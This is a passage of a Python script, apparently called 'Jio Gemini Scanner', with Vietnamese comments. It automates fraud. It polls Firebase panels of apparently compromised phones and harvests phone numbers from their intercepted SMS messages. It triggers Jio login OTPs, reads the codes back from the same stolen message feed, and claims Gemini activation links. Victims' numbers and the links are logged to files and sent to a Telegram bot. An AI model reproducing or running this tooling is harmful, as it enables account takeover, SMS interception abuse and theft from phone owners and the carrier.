    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers     = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
        auth_data = response_json(auth_response)
        if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)
        activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
        activate_data = response_json(activate_response)
        if already_active(api_message(activate_data)):
            return "already_active", ""
        if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
        google_data = response_json(google_response)
        if already_active(api_message(google_data)):
            return "already_active", ""
        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""

# ==================== SAVE ====================

_file_lock = threading.Lock()

def save_link(url: str) -> None:
    if not url:
        return
    with _file_lock:
        existing = set(LINKS_FILE.read_text(encoding="utf-8").splitlines()) if LINKS_FILE.exists() else set()
        if url in existing:
            return
        with LINKS_FILE.open("a", encoding="utf-8") as handle:
            handle.write(url + "\n")

def save_result(serial: int, device_id: str, mobile: str, status: str, url: str) -> None:
    now = datetime.now(ZoneInfo("Asia/Kathmandu"))
    with _file_lock:
        exists = RESULTS_FILE.exists() and RESULTS_FILE.stat().st_size > 0
        with RESULTS_FILE.open("a", newline="", encoding="utf-8") as handle:
            writer = csv.DictWriter(handle, fieldnames=RESULT_FIELDS)
            if not exists:
                writer.writeheader()
            writer.writerow({
                "serial_number": serial,
                "device_id": device_id,
                "mobile_number": mobile,
                "status": status,
                "activation_url": url,
                "nepal_date": now.strftime("%Y-%m-%d"),
                "nepal_time": now.strftime("%I:%M:%S %p"),
            })

# ==================== MAIN LOOP ====================

def run_once(loop_num: int, serial_counter: list[int]) -> tuple[int, int, Counter]:
    """Chạy 1 vòng quét. Trả về (total_online, total_numbers, statuses)."""
    print(f"\n{'='*70}")
    print(f"  🔄 VÒNG #{loop_num} — {datetime.now(ZoneInfo('Asia/Kathmandu')).strftime('%Y-%m-%d %H:%M:%S')} (NPT)")
    print(f"{'='*70}")
    print(f"⚡ Quét song song {len(FIREBASE_PANELS)} panels với {MAX_PANEL_WORKERS} luồng...")

    # --- STEP 1: Quét tất cả panels song song ---
    all_online_devices: dict[str, dict[str, Any]] = {}
    with ThreadPoolExecutor(max_workers=MAX_PANEL_WORKERS) as executor:
        futures = {
            executor.submit(scan_panel, base_url, key): (base_url, key)
            for base_url, key in FIREBASE_PANELS
        }
        for future in as_completed(futures):
            try:
                result = future.result()
                for device_id, info in result.items():
                    all_online_devices[device_id] = info
                    print(f"  ✅ Online: {info['base_url'].split('//')[1].split('.')[0]} → {device_id[:16]}...")
            except Exception:
                pass

    total_online = len(all_online_devices)
    print(f"\n📡 Tổng thiết bị online: {total_online}")
    if not all_online_devices:
        print("  ⚠️  Không có thiết bị nào online.")
        return 0, 0, Counter()

    # --- STEP 2: Trích xuất số điện thoại ---
    print("\n📲 Đang trích xuất số điện thoại từ messages...")
    mappings: dict[str, set[str]] = defaultdict(set)
    device_messages: dict[str, dict[str, dict[str, Any]]] = {}

    for i, (device_id, info) in enumerate(all_online_devices.items(), start=1):
        try:
            messages = latest_messages(
                info["firebase_session"], info["base_url"],
                info["firebase_key"], device_id, MESSAGE_SCAN_LIMIT,
            )
            device_messages[device_id] = messages
            for mobile in number_candidates(messages):
                mappings[mobile].add(device_id)
        except Exception:
            device_messages[device_id] = {}
        if i % 10 == 0 or i == total_online:
            print(f"  Scanned: {i}/{total_online}")

    targets: list[tuple[str, str]] = []
    for mobile, devices in sorted(mappings.items()):
        if devices:
            targets.append((sorted(devices)[0], mobile))

    # Lọc bỏ số đã biết không phải Jio và số đã done
    with _not_jio_lock:
        skipped_not_jio = [m for _, m in targets if m in _not_jio_cache]
    with _done_lock:
        skipped_done = [m for _, m in targets if m in _done_cache]
    targets = [(d, m) for d, m in targets if m not in _not_jio_cache and m not in _done_cache]

    if skipped_not_jio or skipped_done:
        print(f"  ⏭️  Bỏ qua: {len(skipped_not_jio)} not-jio (cached), {len(skipped_done)} đã done")

    total_numbers = len(targets)
    print(f"📱 Tổng số điện thoại unique: {total_numbers}")
    if not targets:
        print("  ⚠️  Không tìm được số nào.")
        return total_online, 0, Counter()

    # --- STEP 3: OTP + Activation ---
    print(f"\n{'='*70}")
    print("🚀 STEP 3: OTP + Kích hoạt Gemini...")
    print(f"{'='*70}")

    statuses: Counter[str] = Counter()
    for device_id, mobile in targets:
        serial_counter[0] += 1
        serial = serial_counter[0]
        info = all_online_devices.get(device_id)
        if not info:
            continue
        print(f"\n[#{serial}] 📱 +91{mobile[-4:].rjust(10,'*')} | Device: {device_id[:18]}...")
        base_url     = info["base_url"]
        firebase_key = info["firebase_key"]
        firebase     = info["firebase_session"]
        device       = info["data"]

        if not isinstance(device, dict) or device.get("status") is not True:
            status, url = "device_offline", ""
        else:
            jio = jio_session()
            if not is_jio_number(jio, mobile):
                status, url = "not_jio_number", ""
                # Cache lại — vòng sau không check nữa
                with _not_jio_lock:
                    _not_jio_cache.add(mobile)
            else:
                print(f"  ✅ Jio number xác nhận! Gửi OTP...")
                known_keys = set(device_messages.get(device_id, {}))
                if not send_otp(jio, mobile):
                    status, url = "otp_send_failed", ""
                else:
                    otp_success = False
                    shared_used: set[str] = set()  # Dùng chung giữa các lần retry
                    for attempt in range(1, OTP_MAX_RETRIES + 1):
                        if wait_for_otp(firebase, base_url, firebase_key, device_id,
                                        known_keys, jio, mobile, shared_used):
                            print(f"  ✅ OTP lần {attempt} thành công!")
                            otp_success = True
                            break
                        if attempt < OTP_MAX_RETRIES:
                            print(f"  🔄 OTP timeout — thử lại lần {attempt + 1}/{OTP_MAX_RETRIES}...")
                            send_otp(jio, mobile)
                    if otp_success:
                        status, url = get_activation(jio)
                    else:
                        status, url = "otp_failed", ""

        statuses[status] += 1
        save_link(url)
        save_result(serial, device_id, mobile, status, url)

        icon = "✅" if status == "activation_url_found" else "❌"
        print(f"  {icon} Status: {status}")
        if url:
            print(f"  🔗 LINK → {url}")
            notify_activation(serial, mobile, url)
            # Cache số đã kích hoạt thành công
            with _done_lock:
                _done_cache.add(mobile)

    return total_online, total_numbers, statuses


def main() -> int:
    print("=" * 70)
    print("  🤖 JIO GEMINI SCANNER — ULTIMATE EDITION")
    print("  ⚡ Threading | 🔁 Auto Loop | 📱 Telegram Notify")
    print("=" * 70)

    # Kiểm tra Telegram
    print("\n📤 Kiểm tra kết nối Telegram...")
    if send_telegram("🤖 <b>Jio Gemini Scanner khởi động!</b>\n\nBot đã sẵn sàng. Đang quét panels..."):
        print("  ✅ Telegram OK!")
    else:
        print("  ⚠️  Telegram không kết nối được — tiếp tục không có thông báo")

    serial_counter = [0]
    loop_num = 0
    total_links_found = 0

    while True:
        loop_num += 1
        total_online, total_numbers, statuses = run_once(loop_num, serial_counter)
        found_this_round = statuses.get("activation_url_found", 0)
        total_links_found += found_this_round

        # Tóm tắt vòng
        print(f"\n{'='*70}")
        print(f"  📊 TÓM TẮT VÒNG #{loop_num}")
        print(f"{'='*70}")
        print(f"  📡 Thiết bị online : {total_online}")
        print(f"  📱 Số điện thoại   : {total_numbers}")
        print(f"  🔗 Link tìm được   : {found_this_round} (tổng: {total_links_found})")
        for st, cnt in sorted(statuses.items()):
            print(f"  • {st:25}: {cnt}")

        # Gửi tóm tắt Telegram
        notify_summary(loop_num, total_online, total_numbers, statuses)

        # Kiểm tra dừng
        if MAX_LOOPS > 0 and loop_num >= MAX_LOOPS:
            print(f"\n✅ Đã chạy đủ {MAX_LOOPS} vòng. Dừng.")
            break

        # Nghỉ trước vòng tiếp theo
        print(f"\n⏳ Nghỉ {LOOP_INTERVAL}s trước vòng #{loop_num + 1}...")
        time.sleep(LOOP_INTERVAL)

    print(f"\n{'='*70}")
    print(f"  🏁 HOÀN TẤT — Tổng link: {total_links_found}")
    print(f"  📄 Links: {LINKS_FILE.resolve()}")
    print(f"  📊 Results: {RESULTS_FILE.resolve()}")
    print(f"{'='*70}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())